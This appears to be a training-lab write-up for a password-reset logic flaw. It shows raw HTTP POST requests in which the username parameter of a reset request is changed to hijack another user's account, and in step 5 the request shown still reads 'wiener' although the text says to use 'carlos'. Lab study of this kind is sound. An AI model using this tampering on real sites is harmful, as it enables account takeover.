# Lab: Password reset broken logic
## Description

1. Login using `wiener`. Get his email address
2. Logout. Type email address into the forgot password form
3. Go to email server and get the reset link. It will look something like this:
`https://aca51f711ebdfd82c0491ec90051008b.web-security-academy.net/forgot-password?temp-forgot-password-token=jryXALIBAxsh6VVEoQqfRfd6DX9zqOqL` (the unique token doesn't seem to be base64 or anything simple)
4. By opening the reset [link](https://aca51f711ebdfd82c0491ec90051008b.web-security-academy.net/forgot-password?temp-forgot-password-token=jryXALIBAxsh6VVEoQqfRfd6DX9zqOqL) and entering a new password genrates the following request:
```yaml
POST /forgot-password?temp-forgot-password-token=jryXALIBAxsh6VVEoQqfRfd6DX9zqOqL HTTP/1.1
Host: aca51f711ebdfd82c0491ec90051008b.web-security-academy.net
Cookie: session=nn17ymNbYXs9SKnBe306g3KBVFMbAbTM

temp-forgot-password-token=jryXALIBAxsh6VVEoQqfRfd6DX9zqOqL&username=wiener&new-password-1=password&new-password-2=password
```
Note: the reset link can only be used once! But notice the `username` parameter is passed along with the request.....
5. Create new reset link, and attempt to replace `wiener` with `carlos`, like this:
```yaml
POST /forgot-password?temp-forgot-password-token=a9pbmLd0JwAHwvHUFXttnA2cU4jsPS2L HTTP/1.1
Host: aca51f711ebdfd82c0491ec90051008b.web-security-academy.net
Cookie: session=nn17ymNbYXs9SKnBe306g3KBVFMbAbTM
Content-Length: 123

temp-forgot-password-token=a9pbmLd0JwAHwvHUFXttnA2cU4jsPS2L&username=wiener&new-password-1=password&new-password-2=password
```

## Solution
See description
